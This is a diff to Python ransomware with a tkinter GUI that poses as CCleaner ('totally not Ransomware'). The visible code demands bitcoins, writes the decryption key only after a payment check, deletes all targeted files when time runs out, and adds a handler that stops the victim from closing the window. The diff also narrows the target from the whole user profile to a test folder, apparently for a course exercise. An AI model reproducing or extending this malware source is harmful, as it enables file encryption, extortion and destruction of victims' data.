@@ -44,7 +44,7 @@ def create_key():
 
 #Writes fernet key to text file on the desktop
 def write_key(key):
-    if bitcoin_entry.get() >= how_many_bitcoins_do_we_want:
+    if bitcoin_entry.get() >= how_many_bitcoins_do_we_want and bitcoin_entry.get().isdigit():
         with open(os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') + '\\filekey.txt', 'wb') as filekey:
             filekey.write(key)
         messagebox.showinfo(title = 'Text File Created', message = "A text file has been created with the key for your files. Enter it into the input field below to get your files back. Thank you for your cooperation.")
@@ -80,12 +80,16 @@ def decrypt_files(file_paths, fernet, key):
         os.remove(os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') + '\\filekey.txt')
         #Message Box announcing to user that their files have been decrypted. Once the box is closed, the program terminates.
         messagebox.showinfo(title = 'Files Decrypted', message = 'Your files have been decrypted. Thank you for your cooperation. Have a nice day')
+
         root.destroy()
 
 #Function to delete all files from the file path from the computer; used if time runs out and user has not sent money.
 def delete_everything(file_paths):
     for f in file_paths:
         os.remove(f)
+
+def on_close():
+    messagebox.showinfo(title = 'Unable to close', message = 'Cannot close program')
 
 # GUI Stuff / Main Program Loop ==========================================================================================================================================================
 
@@ -95,6 +99,7 @@ root.title("CCleaner, totally not Ransomware ( ͡° ͜ʖ ͡°)")
 root.iconbitmap('ccleaner.ico')
 root.geometry("1280x720")
 root.configure(bg = 'white')
+root.protocol('WM_DELETE_WINDOW',on_close)
 
 #Global variable to create the number of bitcoins we want user to send
 how_many_bitcoins_do_we_want = str(random.randint(1,20))
@@ -126,7 +131,7 @@ key_entry = Entry(root, width = 50, borderwidth = 5)
 key_button = Button(root, text = "Decrypt", width = 13, height = 2, borderwidth = 5, font = ('Arial', 18), command = lambda: decrypt_files(file_paths, crypter, key))
 
 #Calls functions to create the file paths of all files to encrypt
-file_paths = generate_file_list_keyword(os.environ["USERPROFILE"])
+file_paths = generate_file_list_keyword('C:\\Users\\bwiit\\Desktop\\CECS378Test')
 #Creates the Fernet object and the fernet encryption key
 crypter, key = create_key()
 #Calls function to encrypt all the files in the generated file paths using the 'crypter' Fernet object
